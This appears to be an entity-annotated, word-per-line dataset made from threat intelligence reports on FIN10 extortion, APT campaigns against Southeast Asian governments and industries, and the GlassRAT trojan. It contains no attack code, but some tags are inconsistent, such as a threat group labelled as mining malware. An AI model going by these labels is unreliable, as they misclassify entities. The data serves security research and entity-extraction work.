the
threat
actor
.

Strong
segmentation
and
controls
over
backups
will
help
organizations
to
quickly
recover
from
a
breach
.

Additionally
,
when
the
incident
has
been
resolved
organizations
should
focus
on
broader
security
improvements
and
ensuring
the
threat
actor
can
not
come
back
in
a
different
way
.

FIN10 B_malware.mining
:
ANATOMY
OF
A
CYBER
EXTORTION
OPERATION

15

Appendix
–
Sample
Extortion
Email

The
text
below
is
a
redacted
email
that
FIN10 B_malware.mining
sent
to
one
of
their
victims
.

To
download
this
or
other
FireEye
Threat
Intellience
reports
,
visit
:

www.fireeye.com/reports B_url.normal

FireEye
,
Inc
.

1440
McCarthy
Blvd
.

Milpitas
,
CA
95035

408.321.6300
/
877.FIREEYE
(
347.3393
)
/
info@FireEye.com

www.FireEye.com B_url.normal

FireEye
is
the
intelligence-led
security
company
.

Working
as
a
seamless
,
scalable
extension
of
customer
security
operations
,
FireEye
offers
a
single
platform
that
blends
innovative
security
technologies
,
nation-state
grade
threat
intelligence
,
and
world-renowned
Mandiant®
consulting
.

With
this
approach
,
FireEye
eliminates
the
complexity
and
burden
of
cyber
security
for
organizations
struggling
to
prepare
for
,
prevent
,
and
respond
to
cyber
attacks
.

FireEye
has
over
5,300
customers
across
67
countries
,
including
more
than
845
of
the
Forbes
Global
2000
.

©
2017
FireEye
,
Inc
.

All
rights
reserved
.

FireEye
is
a
registered
trademark
of
FireEye
,
Inc
.

All
other
brands
,
products
,
or
service
names
are
or
may
be
trademarks
or
service
marks
of
their
respective
owners
.

SP.FIN10.EN-US.062017
SPECIAL
REPORT

FIREEYE
THREAT
INTELLIGENCE

SOUTHEAST
ASIA
:
AN
EVOLVING
CYBER
THREAT
LANDSCAPE

MARCH
2015

SECURITY
REIMAGINED

SPECIAL
REPORT

Southeast
Asia
:
An
Evolving
Cyber
Threat
Landscape

CONTENTS

MARCH
2015

Introduction

Key
Findings

Detecting
Targeted
Threats
in
Southeast
Asia
and
Beyond

Malware
Hitting
Southeast
Asian
Targets

Targeted
Malware
,
Industry
Breakdown

Detecting
Non-Targeted
Threats

Southeast
Asia
's
Leading
Industry
Sectors
Attract
APT
Actors

Regional
Governments
and
Militaries
:
In
APT
Groups
'
Crosshairs

APT
Groups
and
the
South
China
Sea
:
Territorial
Disputes
with
a
Digital
Edge

Threat
Groups
Target
Southeast
Asian
Governments
and
Militaries
over
Territorial
Claims

APT
Groups
Gather
Political
Intelligence

Conclusion

3

4

4

5

6

6

7

12

12

13

13

14

2


SPECIAL
REPORT

While
many
of
the
headline-grabbing
cyber
security
breaches
of
2014
involved
major
U.S.
companies
,
Southeast
Asia
quietly
dealt
with
its
share
of
cyber
attacks
.

Like
the
U.S.
,
companies
in
this
region
face
a
complex
threat
landscape
filled
with
advanced
cyber
attackers
intent
on
stealing
corporate
data
and
state
secrets
.

THE
MISSION
IS
TWO-FOLD
:

Steal
intellectual
property
and
inside
information
from
leading
companies
.

Obtain
intelligence
on
rival
governments
during
longrunning
political
disputes
,
especially
those
involving
the
disputed
South
China
Sea
.

Advanced
persistent
threat
(
APT
)
actors
are
one
of
the
biggest
challenges
for
the
region
.

Leading
companies
that
do
business
in
the
energy
,
telecommunications
,
hightech
,
finance
,
and
transportation
sectors
are
targets
of
APT
groups
.

This
report
describes
malware
detected
at
commercial
and
government
entities
across
Singapore
,
Malaysia
,
Thailand
,
Vietnam
,
Philippines
,
Indonesia
,
and
Brunei
.

It
also
discusses
advanced
threat
groups
behind
many
of
these
attacks
and
their
unique
motives
in
this
region
.

3

SPECIAL
REPORT

KEY
FINDINGS

DETECTING
MALWARE
ACROSS
SOUTHEAST
ASIA

CYBER
THREATS
TO
KEY
INDUSTRIES

CYBER
THREATS
TO
GOVERNMENTS

29
%

From
July
to
December
2014
,
FireEye
products
helped
29
percent
of
our
customers
in
Southeast
Asia
detect
malware
used
by
APT
groups
and
other
actors
targeting
their
networks
.

Southeast
Asian
companies
regularly
attract
the
interest
of
cyber
spies
and
criminals
looking
to
steal
information
about
the
region
's
growing
industry
sectors—energy
,
telecommunications
,
high-tech
,
transportation
,
and
finance
.

Territorial
disputes
in
the
South
China
Sea
drive
cyber
espionage
activity
in
Southeast
Asia
.

Both
government
and
private
industries
are
targets
of
threat
actors
seeking
to
steal
information
in
these
disputes
.

Detecting
Targeted
Threats
in
Southeast
Asia
and
Beyond

From
July
to
December
2014
,
FireEye
products
helped
29
percent
of
our
customers
in
Southeast
Asia
detect
malware
used
by
APT
groups
and
other
attackers
targeting
their
networks
.

When
factoring
in
the
rest
of
our
Asia-Pacific
clients
,
that
percentage
jumps
to
37
percent—significantly
higher
than
the
global
average
of
27
percent
.

(
These
statistics
are
generated
from
customers
who
have
opted
to
share
anonymized
data
through
FireEye
.
)

In
the
Asia-Pacific
region
,
FireEye
products
helped
37
%
of
our
customers
detect
malware
.

PERCENTAGE
OF
FIREEYE
CUSTOMERS
'
TARGETED
MALWARE
ALERTS
JULY
-
DECEMBER
2014

60
%

54
%

52
%

37
%

31
%

29
%

27
%

27
%

27
%

26
%

23
%

HONG
KONG

TAIWAN

SOUTH
KOREA

ASIA
PACIFIC
REGION

INDIA

SOUTHEAST

AUSTRALIA

GLOBAL

JAPAN

THAILAND

SINGAPORE

ASIA
REGION

4

Southeast
Asia
:
An
Evolving
Cyber
Threat
Landscape

SPECIAL
REPORT

Malware
Hitting
Southeast
Asian
Targets

Lecna B_malware.drop
,
Mirage B_malware.drop
,
CannonFodder B_malware.drop
,
and
Leouncia B_malware.backdoor
were
among
the
most
frequently
detected
malware
families
.

APT
AND
TARGETED
MALWARE
DETECTIONS
JULY
-
DECEMBER
2014
:
SOUTHEAST
ASIA

4
%

4
%

4
%

5
%

6
%

5
%

5
%

6
%

6
%

7
%

7
%

27
%

14
%

Lecna B_malware.drop

Gh0STRAT B_malware.backdoor

Mirage B_malware.drop

Page B_malware.backdoor

Downloader.Pnaip B_malware.drop

CannonFodder B_malware.drop

Leouncia B_malware.backdoor

Kaba B_malware.drop
( I
aka I
SOGU I
) I

LV B_malware.backdoor
( I
aka I
NJRAT I
) I

Houdini B_malware.backdoor

XtremeRAT B_malware.backdoor

NetEagle B_malware.backdoor

1qaz B_malware.backdoor

APT
AND
TARGETED
MALWARE
DETECTIONS
JULY-DECEMBER
2014
:
GLOBAL

20
%

24
%

15
%

11
%

3
%

3
%

3
%

4
%

8
%

9
%

LV B_malware.backdoor
( I
aka I
NJRAT I
) I

Gh0STRAT B_malware.backdoor

Kaba B_malware.drop
( I
aka I
SOGU I
) I

SpyNet B_malware.backdoor

XtremeRAT B_malware.backdoor

ZXShell B_malware.backdoor

ChinaChopper B_malware.drop

PHOTO B_malware.drop

Page B_malware.backdoor

SAFERSING B_malware.backdoor

27
%

14
%

7
%

7
%

6
%

6
%

5
%

5
%

6
%

5
%

4
%

4
%

4
%

24
%

20
%

15
%

11
%

9
%

8
%

4
%

3
%

3
%

3
%

5

Southeast
Asia
:
An
Evolving
Cyber
Threat
Landscape

SPECIAL
REPORT

Targeted
Malware
,
Industry
Breakdown

More
than
half
of
the
targeted
malware
that
FireEye
detected
in
Southeast
Asia
came
from
government
and
telecommunications
sites
.

(
Note
:
these
statistics
do
not
account
for
the
number
of
appliances
at
a
customer
site
or
the
number
of
FireEye
customers
in
a
given
industry
.
)

APT
AND
TARGETED
MALWARE
DETECTIONS
BY
INDUSTRY
IN
SOUTHEAST
ASIA

7
%

6
%

16
%

10
%

24
%

27
%

10
%

Government

Telecom

Financial
services

High-tech

Transportation

Energy/utilities

Education

27
%

24
%

16
%

10
%

10
%

7
%

6
%

NON-TARGETED
MALWARE
DETECTIONS

JULY
-
DECEMBER
2014
GLOBALLY

4
%

4
%

4
%

4
%

29
%

5
%

7
%

10
%

12
%

21
%

Asprox

Zeus

Kuluoz

Sality

ZeroAccess

Kelihos

Fareit

Conficker

Carberp

Necurs

29
%

21
%

12
%

10
%

7
%

5
%

4
%

4
%

4
%

4
%

Detecting
Non-Targeted
Threats

In
addition
to
the
targeted
and
APT
malware
,
organizations
in
the
region
frequently
detect
other
threats
,
including
banking
Trojans
,
botnets
,
and
other
types
of
cyber
crime
.

Regionally
,
our
customers
most
frequently
detect
Zeus
(
a
banking
Trojan
)
and
Sality
(
a
multi-featured
Trojan
)
on
their
networks
.

These
commodity
malware
families
are
widely
known
,
but
dismissing
the
threat
they
pose
is
a
mistake
.

For
one
,
they
continue
to
evade
detection
by
traditional
security
tools
,
making
them
highly
effective
.

And
advanced
threat
groups
often
use
these
common
malware
families
to
gain
a
foothold
into
corporate
environments
.

6

Southeast
Asia
:
An
Evolving
Cyber
Threat
Landscape

SPECIAL
REPORT

SOUTHEAST
ASIA
'S
LEADING
INDUSTRY

SECTORS
ATTRACT
APT
ACTORS

We
observe
APT
groups
routinely
targeting
companies
in
Southeast
Asia
to
steal
intellectual
property
(
IP
)
.

We
believe
that
once
stolen
,
this
IP
often
makes
its
way
to
Chinese
companies
.

These
companies
can
use
the
stolen
IP
to
bypass
years
of
research
and
development
costs
and
get
an
inside
edge
when
they
deal
with
competitors
in
the
region
.

Southeast
Asia
's
financial
sector
faces
a
dual
threat
.

First
,
standard
cybercriminals
are
looking
to
steal
money
from
them
.

Second
,
advanced
threat
actors
are
seeking
sensitive
financial
information
for
a
business
advantage
.

As
increasing
investments
and
diversifying
economies
spur
development
in
the
region
,
this
growth
simultaneously
becomes
even
more
attractive
to
APT
groups
.

These
industry
sectors
appear
to
be
most
heavily
targeted
by
APT
groups
:

ENERGY

TELECOMMUNICATIONS

HIGH-TECH

TRANSPORTATION

FINANCIAL

SERVICES

7

The
following
table
outlines
some
of
the
targeted
sectors
and
why
APT
groups
would
target
companies
'
information
:

Sector

Energy

Most
Likely
Corporate
Targets

•
Green
Energy
Technology
Researchers
and
Providers

•
Utilities

•
Oil
and
Gas
Producers

•
Critical
Infrastructure
Providers
and
Operators

Why
are
APT
Groups
Interested
?

APT
groups
have
long
targeted
U.S.
and
multinational
corporations
with
strong
offerings
in
green
technology
and
other
clean
energy
production
.

R
&
D
breakthroughs
in
this
sector
would
provide
tremendous
value
to
China
's
energy
sector
,
especially
in
light
of
continued
international
pressure
to
lower
emissions
.

Southeast
Asia
is
an
important
potential
source
of
hydrocarbon
reserves
.

The
disputed
territories
in
the
South
China
Sea
are
estimated
to
contain
a
considerable
amount
of
natural
gas
and
petroleum
.

As
rapid
economic
growth
creates
a
surge
in
energy
demand
,
energy
resources
in
the
disputed
maritime
territories
have
become
increasingly
valuable
.

All
of
these
factors
are
likely
to
provoke
further
APT
activity
.

Recent
Cases

FireEye
has
observed
multiple
instances
of
APT
groups
breaching
the
networks
of
regional
energy
companies
.

In
one
case
,
we
discovered
three
different
threat
groups
attempting
to
gain
access
to
the
network
of
an
oil
company
that
conducts
offshore
oil
exploration
.

The
threat
groups
appeared
to
target
affiliates
of
the
company
,
as
well
as
its
infrastructure
development
divisions
.

We
believe
these
threat
groups
chiefly
sought
data
of
competitive
value
.

But
they
were
also
on
the
lookout
for
any
information
about
the
company
's
exploration
plans
and
movements
in
the
area
.

We
have
also
observed
targeted
threat
actors
deploying
malware
against
the
networks
of
a
major
electric
grid
operator
in
the
region
.

8

Southeast
Asia
:
An
Evolving
Cyber
Threat
Landscape

SPECIAL
REPORT

Sector

Telecommunications

High-Tech

Why
are
APT
Groups
Interested
?

We
have
observed
one
APT
group
,
which
we
call
APT5
,
particularly
focused
on
telecommunications
and
technology
companies
.

More
than
half
of
the
organizations
we
have
observed
being
targeted
or
breached
by
APT5
operate
in
these
sectors
.

Several
times
,
APT5
has
targeted
organizations
and
personnel
based
in
Southeast
Asia
.

APT5
has
been
active
since
at
least
2007
.

It
appears
to
be
a
large
threat
group
that
consists
of
several
subgroups
,
often
with
distinct
tactics
and
infrastructure
.

APT5
has
targeted
or
breached
organizations
across
multiple
industries
,
but
its
focus
appears
to
be
on
telecommunications
and
technology
companies
,
especially
information
about
satellite
communications
.

Most
Likely
Corporate
Targets

•
Regional
Telecommunication
Providers

•
Asia-Based
Employees
of
Global
Telecommunications
and
Tech
Firms

•
High-Tech
Manufacturing

•
Military
Application
Technology

Recent
Cases

APT5
targeted
the
network
of
an
electronics
firm
that
sells
products
for
both
industrial
and
military
applications
.

The
group
subsequently
stole
communications
related
to
the
firm
's
business
relationship
with
a
national
military
,
including
inventories
and
memoranda
about
specific
products
they
provided
.

In
one
case
in
late
2014
,
APT5
breached
the
network
of
an
international
telecommunications
company
.

The
group
used
malware
with
keylogging
capabilities
to
monitor
the
computer
of
an
executive
who
manages
the
company
's
relationships
with
other
telecommunications
companies
.

This
method
allowed
APT5
to
collect
data
on
topics
such
as
:

•
Pricing
discussions
,
bidding
strategies
and
competitor
pricing
information

•
Schedules
for
contract
bidding
and
product
deployment

•
Opportunities
in
Asian
telecommunications
market

•
Business
opportunities
with
other
telecommunications
companies

APT5
also
targeted
the
networks
of
some
of
Southeast
Asia
's
major
telecommunications
providers
with
Leouncia B_malware.backdoor
malware
.

We
suspect
that
the
group
sought
access
to
these
networks
to
obtain
information
that
would
enable
it
to
monitor
communications
passing
through
the
providers
'
systems
.

9

Southeast
Asia
:
An
Evolving
Cyber
Threat
Landscape

SPECIAL
REPORT

Sector

Transportation

Why
are
APT
Groups
Interested
?

APT
groups
likely
target
the
region
's
transportation
companies
to
monitor
the
progress
of
high-profile
projects
that
have
the
potential
to
fuel
continued
economic
growth
in
the
region
.

Most
Likely
Corporate
Targets

•
Shipping
Companies

•
Port
Operators

•
Airlines

•
Public
Transit
Systems

Recent
Cases

In
one
case
,
a
threat
group
that
has
historically
focused
its
operations
on
targets
in
the
Philippines
and
Malaysia
spoofed
the
domain
names
of
two
well-known
international
shipping
companies
.

One
of
the
spoofed
companies
was
a
major
commercial
freight
company
that
transports
commodities
around
the
globe
.

The
other
was
a
regional
shipbuilding
company
.

The
plausible
URLs
were
designed
to
entice
potential
victims
within
targeted
industries
to
click
.

Another
APT
group
targeted
a
major
operator
of
container
ship
terminals
in
Southeast
Asia
.

We
suspect
the
group
targeted
the
port
operator
to
monitor
its
communications
with
regional
security
and
military
organizations
that
partner
with
the
company
.

A
threat
group
targeted
a
rail
operator
.

We
detected
variants
of
the
Lecna/BackSpace
APT
malware
in
the
transit
company
's
networks
in
early
2014
.

10

Southeast
Asia
:
An
Evolving
Cyber
Threat
Landscape

SPECIAL
REPORT

Sector

Financial
Services

Most
Likely
Corporate
Targets

•
Banks

•
Companies
Funding
Major
Regional
Development
Projects

•
Institutions
Dealing
With
Monetary
Policy

Why
are
APT
Groups
Interested
?

Banks
in
Southeast
Asia
appear
to
face
a
double
threat
.

The
first
is
the
pernicious
cybercrime
activity
we
observe
around
the
world
,
such
as
credit
card
fraud
and
the
theft
of
banking
credentials
.

The
second
threat
is
focused
specifically
on
banks
with
a
development
mission
in
the
region
.

Recent
Cases

In
one
case
,
a
threat
group
targeted
a
development
bank
that
invests
in
the
growth
of
strategic
projects
and
industries
in
the
region
.

In
another
instance
,
we
saw
two
different
threat
groups
infect
the
networks
of
a
central
bank
.

Stolen
data
on
the
country
's
monetary
policies
and
banking
system
could
be
highly
valuable
information
to
someone
looking
to
understand
and
anticipate
broader
banking
and
funding
trends
in
the
country
and
region
.

Banks
that
invest
in
the
region
's
strategic
growth
face
more
threats
than
traditional
credit
card
fraud
and
financial
hackers
.

11

Southeast
Asia
:
An
Evolving
Cyber
Threat
Landscape

SPECIAL
REPORT

REGIONAL
GOVERNMENTS
AND
MILITARIES
:

IN
APT
GROUPS
'
CROSSHAIRS

SOUTH
CHINA
SEA

PHILIPPINES

THAILAND

MALAYSIA

INDONESIA

BRUNEI

MALAYSIA

INDONESIA

The
territorial
disputes
have
huge
consequences
for
each
claimant
's
national
and
economic
security
.

The
stakes
are
high
:
more
than
half
of
the
world
's
commercial
shipping
passes
through
the
South
China
Sea
.

It
contains
potential
reserves
of
up
to
11
billion
barrels
of
oil
,
190
trillion
cubic
feet
of
natural
gas
,
and
prime
fishing
areas
.

Territorial
disputes
have
lingered
for
decades
.

Along
with
militaries
and
coast
guards
of
claimant
countries
,
South
China
Sea
disputes
involve
regional
oil
firms
,
cargo
companies
,
and
fisheries
.

The
territory
has
been
at
the
center
of
many
international
incidents
,
reflecting
the
considerable
national
and
economic
security
implications
for
the
rival
claimants
.

12

The
APT
groups
that
we
track
actively
target
governments
and
militaries
for
inside
information
into
negotiations
and
political
issues
.

APT
groups
that
target
governments
in
the
region
are
frequently
interested
in
topics
related
to
the
South
China
Sea
.

And
they
are
increasingly
active
during
times
of
heightened
political
tension
or
transition
.

APT
Groups
and
the
South
China
Sea
:
Territorial
Disputes
with
a
Digital
Edge

FireEye
routinely
observes
APT
groups
steal
information
dealing
with
South
China
Sea
disputes
and
their
economic
effects
from
the
networks
of
governments
and
companies
involved
.

Control
over
territory
in
the
South
China
Sea
is
a
fiercely
contested
issue
between
China
,
the
Philippines
,
Brunei
,
Vietnam
,
Taiwan
,
and
Malaysia
.

Government
and
military
entities
are
frequently
targeted
with
malware
that
steals
sensitive
security
details
.

Threat
Groups
Target
Southeast
Asian
Governments
and
Militaries
over
Territorial
Claims

Southeast
Asian
government
and
military
entities
have
been
targeted
several
times
in
what
we
suspect
are
efforts
to
obtain
intelligence
related
to
territorial
disputes
.

•
An
APT
group
stole
data
from
one
country
's
government
and
military
networks
on
several
occasions
,
including
a
period
of
heightened
tension
over
competing
claims
in
the
South
China
Sea.1

Some
of
the
files
that
the
APT
group
took
included
the
following
:

–
General
military
documents

–
Internal
communications

–
Equipment
maintenance
reports
and
specifications

–
Event-related
materials

–
Documentation
of
organizational
programs
and
initiatives

•
Other
threat
groups
have
targeted
a
country
's
air
force
with
spear-phishing
emails
that
referenced
the
country
's
military
and
regional
maritime
disputes
.

These
emails
were
designed
to
appear
to
originate
from
email
accounts
associated
with
other
elements
of
the
military
.

•
Other
threat
actors
have
used
the
Grillmark
backdoor
to
attempt
to
gain
access
to
the
networks
of
two
countries
'
government
and
military
entities
.

These
threat
actors
targeted
their
victims
through
spear-phishing
emails
that
contained
weaponized
documents
relating
to
either
diplomatic
or
military
affairs
.

APT
Groups
Gather
Political
Intelligence

In
August
2014
,
an
APT
group
appeared
to
target
intelligence
related
to
a
Southeast
Asia
government
.

The
threat
actors
sent
a
spearphishing
email
that
referenced
the
country
's
leadership
and
contained
a
document
with
sections
extracted
from
related
news
articles
.

The
email
appeared
to
originate
from
a
compromised
intelligence
agency
email
account
,
although
the
threat
actors
may
have
faked
the
email
address
.

Many
of
the
email
's
recipients
were
associated
with
the
targeted
country
's
government
and
military
or
were
involved
in
intel-sharing
partnerships
.

In
either
case
,
the
recipient
would
likely
have
access
to
information
regarding
the
country
's
security
and
internal
stability
.

1
Whaley
,
Floyd
.

'A
Leviathan
Turns
Philippine
Fishermen
into
Desperate
Darters
.
'

The
New
York
Times
.

18
May
2014
.

Web
.

23
May
2014
.

13

Southeast
Asia
:
An
Evolving
Cyber
Threat
Landscape

SPECIAL
REPORT

CONCLUSION

Public
and
private
organizations
in
the
Southeast
Asian
region
are
prime
targets
for
advanced
threat
groups
.

The
data
is
clear
:
targeted
threat
actors
are
focused
on
getting
into
the
networks
of
and
stealing
from
fast-growing
industries
,
as
well
as
from
organizations
involved
in
territorial
claims
over
the
South
China
Sea
.

The
outcome
of
the
dispute
has
major
geopolitical
and
economic
implications
for
multiple
countries
.

The
area
is
key
to
regional
trade
because
of
its
rich
energy
reserves
,
prime
fishing
waters
,
and
significance
to
commercial
shipping
routes
.

These
issues
and
the
region
's
mounting
importance
will
likely
propel
state-sponsored
threat
groups
to
continue
targeting
Southeast
Asian
governments
and
companies
for
the
near
future
.

State-sponsored
threat
groups
will
continue
to
target
Southeast
Asian
governments
and
companies
.

ABOUT
FIREEYE

FireEye
protects
the
most
valuable
assets
in
the
world
from
those
who
have
them
in
their
sights
.

Our
combination
of
technology
,
intelligence
,
and
expertise
—
reinforced
with
the
most
aggressive
incident
response
team
—
helps
eliminate
the
impact
of
security
breaches
.

We
find
and
stop
attackers
at
every
stage
of
an
incursion
.

With
FireEye
,
you
'll
detect
attacks
as
they
happen
.

You
'll
understand
the
risk
these
attacks
pose
to
your
most
valued
assets
.

And
you
'll
have
the
resources
to
quickly
respond
and
resolve
security
incidents
.

FireEye
has
over
3,100
customers
across
67
countries
,
including
over
200
of
the
Fortune
500
.

14

To
download
this
or
other
FireEye
Threat
Intelligence
reports
,
visit
:
www.fireeye.com/reports B_url.normal

FireEye
,
Inc
.

|
1440
McCarthy
Blvd
.

Milpitas
,
CA
95035
|
408.321.6300
|
877.FIREEYE
(
347.3393
)
|
info@fireeye.com
|
www.fireeye.com B_url.normal

©
2015
FireEye
,
Inc
.

All
rights
reserved
.

FireEye
is
a
registered
trademark
of
FireEye
,
Inc
.

All
other
brands
,
products
,
or
service
names
are
or
may
be
trademarks
or
service
marks
of
their
respective
owners
.

SP.SEA.EN-US.022015
PEERING
INTO
GLASSRAT B_malware.drop

A
Zero
Detection
Trojan
from
China

Authors
:

Kent
Backman
,
primary
research

Jared
Myers
,
contributing

Chris
Ahearn
,
contributing

Maor
Franco
,
contributing

Peter
Beardmore
,
contributing

November
23
,
2015

RSA
Research

Content
and
liability
disclaimer

This
Research
Paper
is
for
general
information
purposes
only
,
and
should
not
be
used
as
a
substitute
for
consultation
with
professional
advisors
.

EMC
has
exercised
reasonable
care
in
the
collecting
,
processing
,
and
reporting
of
this
information
but
has
not
independently
verified
,
validated
,
or
audited
the
data
to
verify
the
accuracy
or
completeness
of
the
information
.

EMC
shall
not
be
responsible
for
any
errors
or
omissions
contained
on
this
Research
Paper
,
and
reserves
the
right
to
make
changes
anytime
without
notice
.

Mention
of
non-EMC
products
or
services
is
provided
for
informational
purposes
only
and
constitutes
neither
an
endorsement
nor
a
recommendation
by
EMC
.

All
EMC
and
third-party
information
provided
in
this
Research
Paper
is
provided
on
an
'as
is
'
basis
.

EMC
DISCLAIMS
ALL
WARRANTIES
,
EXPRESSED
OR
IMPLIED
,
WITH
REGARD
TO
ANY
INFORMATION
(
INCLUDING
ANY
SOFTWARE
,
PRODUCTS
,
OR
SERVICES
)
PROVIDED
IN
THIS
RESEARCH
PAPER
,
INCLUDING
THE
IMPLIED
WARRANTIES
OF
MERCHANTABILITY
AND
FITNESS
FOR
A
PARTICULAR
PURPOSE
,
AND
NON-INFRINGEMENT
.

Some
jurisdictions
do
not
allow
the
exclusion
of
implied
warranties
,
so
the
above
exclusion
may
not
apply
to
you
.

In
no
event
shall
EMC
be
liable
for
any
damages
whatsoever
,
and
in
particular
EMC
shall
not
be
liable
for
direct
,
special
,
indirect
,
consequential
,
or
incidental
damages
,
or
damages
for
lost
profits
,
loss
of
revenue
or
loss
of
use
,
cost
of
replacement
goods
,
loss
or
damage
to
data
arising
out
of
the
use
or
inability
to
use
any
EMC
website
,
any
EMC
product
or
service
.

This
includes
damages
arising
from
use
of
or
in
reliance
on
the
documents
or
information
present
on
this
Research
Paper
,
even
if
EMC
has
been
advised
of
the
possibility
of
such
damages

Copyright
©
2015
EMC
Corporation
.

All
Rights
Reserved
.

Use
,
copying
,
and
distribution
of
any
EMC
software
described
in
this
publication
requires
an
applicable
software
license
.

RSA
and
the
RSA
logo
are
registered
trademarks
or
trademarks
of
EMC
Corporation
in
the
United
States
and
other
countries
.

All
other
products
and/or
services
referenced
are
trademarks
of
their
respective
companies
.

Published
in
the
USA
.

November
23
,
2015

2

EXECUTIVE
SUMMARY
..........................................................................
4

OVERVIEW
...........................................................................................
4

BACKGROUND
......................................................................................
4

DROPPER
SUBMISSIONS
FROM
CHINA
.................................................
6

ORGANIZATIONS
.................................................................................
7

GLASSRAT B_malware.drop
MALWARE
ANALYSIS
,
DESIGNED
FOR
DECEPTION
..............
8

GLASSRAT B_malware.drop
CAPABILITIES
AND
FUNCTIONS
.......................................
10

COMMAND
AND
CONTROL
..................................................................
11

APPENDIX
..........................................................................................
13

PRIVATE
ANNEX
.................................................................................
13

3

EXECUTIVE
SUMMARY

RSA
Research
has
discovered
a
'zero
detection
'
Remote
Administration
Tool
(
RAT
)
dubbed
GlassRAT B_malware.drop
,
signed
with
a
certificate
which
appears
to
have
been
misappropriated
from
a
popular
software
developer
in
China
.

This
malware
has
gone
under
the
radar
for
what
may
be
several
years
.

Telemetry
and
limited
anecdotal
reports
indicate
that
Chinese
nationals
associated
with
large
multinational
corporations
may
be
the
targets
of
campaigns
employing
GlassRAT B_malware.drop
.

While
'transparent
'
to
most
antivirus
products
,
GlassRAT B_malware.drop
can
be
detected
using
network
forensic
or
endpoint
tools
such
as
RSA®
Security
Analytics
and/or
RSA®
ECAT
.

Also
presented
is
evidence
that
GlassRAT B_malware.drop
's
command
and
control
(
C2
)
infrastructure
has
some
historical
overlap
with
other
malicious
malware
campaigns
that
have
previously
targeted
Asia-based
organizations
of
geopolitical
and
strategic
importance
.

OVERVIEW

When
a
cyber
espionage
campaign
is
identified
;
the
threat
actors
'
tools
,
techniques
,
and
procedures
revealed
;
the
malware
now
detectable
by
antivirus-
What
do
the
bad
guys
do
next
?

History
shows
us
that
this
is
just
part
of
the
process
.

Once
operations
or
campaigns
are
uncovered
,
the
attackers
have
contingency
plans
,
which
can
include
minimally
substituting
only
the
tools
in
their
kit
that
may
have
been
detected
and/or
perhaps
finding
new
victims
,
who
are
less
alert
to
their
threat
.

There
maybe
no
need
to
change
the
Command
and
Control
infrastructure
or
their
techniques
.

In
very
large
cyber
intelligence
organizations
,
which
carry
a
diverse
list
of
objectives
and
targets
,
there
is
likely
to
be
shared
leadership
,
policies
and
procedures
,
infrastructure
,
and
ample
sources
and
libraries
of
advanced
hacking
tools
(
many
still
unexposed
to
researchers
)
-
all
servicing
subordinate
organizations
with
far
narrower
objectives
.

GlassRAT B_malware.drop
has
(
briefly
)
shared
C2
infrastructure
with
some
large
campaigns
,
identified
earlier
in
the
decade
,
that
targeted
geopolitical
organizations
in
the
Asia-Pacific
region
.

The
telemetry
of
GlassRAT B_malware.drop
and
limited
forensic
samples
suggest
that
targeting
is
narrowly
focused
.

Thus
,
what
makes
GlassRAT B_malware.drop
notable
is
not
what
it
is
,
but
perhaps
rather
where
it
came
from
,
who
is
using
it
,
and
for
what
purpose
.

Spoiler
alert
:
this
paper
does
not
offer
a
conclusion
.

Rather
,
we
believe
the
limited
facts
are
worth
consideration
,
particularly
when
there
may-well
be
many
more
undetected
/
undetectable
samples
in
the
wild
.

Detecting
the
infrastructure
and
resulting
behavior
of
these
tools
is
perhaps
more
important
when
preventive
defenses
consistently
fail
.

It
is
also
crucially
important
to
recognize
the
potential
origins
of
these
attacks
,
when
detected
,
to
better
understand
risks
to
the
organization
.

RSA
Research
looked
for
any
similarities
with
other
previously
described
malware
,
and
exploitation
campaigns
.

While
several
code
similarities
were
found
with
other
malware
such
as
Taidoor1 B_malware.backdoor
and
Taleret2 B_malware.backdoor
,
the
most
interesting
overlap
with
GlassRAT B_malware.drop
might
be
in
the
C2
infrastructure
shared
with
geopolitical
campaigns
(
outlined
below
)
,
which
were
reported
earlier
in
this
decade
.

BACKGROUND

GlassRAT B_malware.drop
appears
to
have
operated
,
stealthily
,
for
nearly
3
years
in
some
environments
.

Evidence
indicates
that
Chinese
nationals
associated
with
large
multinational
corporations
in
and
outside
of
China
may
be
the
targets
of
campaigns
employed
by
GlassRAT B_malware.drop
.

GlassRAT B_malware.drop
employs
many
of
the
telltale
signs
of
good
,
at
least
very
effective
,
malware
design
.

Its
dropper
is
signed
using
a
compromised
certificate
from
a
trusted
and
well-known
publisher.3
It
deletes
itself
after
successfully
delivering
its
payload
.

Once
installed
,
the
malicious
DLL
file
persists
below
the
radar
of
endpoint
antivirus
.

GlassRAT B_malware.drop
first
came
to
the
attention
of
RSA
Research
in
February
2015
when
the
RSA®
Incident
Response
team
,
which
specializes
in
responding
to
advance
threat
intrusions
in
large
enterprise
networks
,
detected
malicious
traffic
while
investigating
an
incident
at
a
multi-national
firm
based
in
the
U.S.
A
dll
sample
was
discovered
,
using
RSA
ECAT
,
on
the
PC
of
a
Chinese
national
.

There
was
no
evidence
of
any
dropper
.

Retrospective
analysis
on
Virus
Total
revealed
a
sample
submitted
from
Hong
Kong
in
December
2014
,
which
exhibited
matching
characteristics
,
but
a
different
hash
.

This

1
http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_the_taidoor_campaign.pdf B_url.normal

2
https://www.fireeye.com/blog/threat-research/2013/09/evasive-tactics-taidoor-3.html B_url.normal

3
The
Certificate
Authority
(
CA
)
that
issued
this
certificate
was
informed
and
subsequently
revoked
the
likely
stolen
code-signing
certificate
,
after
independently
confirming
the
maliciousness
of
the
signed
code
.

RSA
Research

prompted
RSA
to
create
a
Yara
signature
which
was
then
fed
into
the
RSA
Research
hunting
capability
,
as
well
as
to
ECAT
in
the
client
environment
.

That
signature
alerted
several
months
later
,
in
September
2015
,
from
samples
appearing
to
originate
in
China
.

These
included
two
droppers
,
and
malware
that
was
functionally
identical
but
with
different
C2
.

(
The
domains
were
different
,
but
the
IP
's
overlapped
with
the
previous
samples
for
a
period
of
time
.
)

RSA
Research
has
linked
GlassRAT B_malware.drop
C2
to
other
malicious
malware
C2
infrastructure
by
way
of
malicious
domains
that
pointed
to
common
hosting
.

In
September
2012
,
Dell
SecureWorks
reported
on
a
cyber
espionage
campaign
that
used
a
RAT
named
Mirage
(
also
known
as
MirageFox
)
.
4

PlugX
C2
hosts
in
these
and
other
campaigns
were
enumerated56
by
Haruyama
and
Suzuki
at
BlackHat
Asia
in
2014
.

The
threat
actor
group
who
controlled
alternate009.com B_url.cncsvr
created
C2
host
records
for
PlugX
malware
targeting
Mongolian
government78
.

That
same
threat
actor
group
who
controlled
alternate009.com B_url.cncsvr
created
C2
host
records
for
Mirage
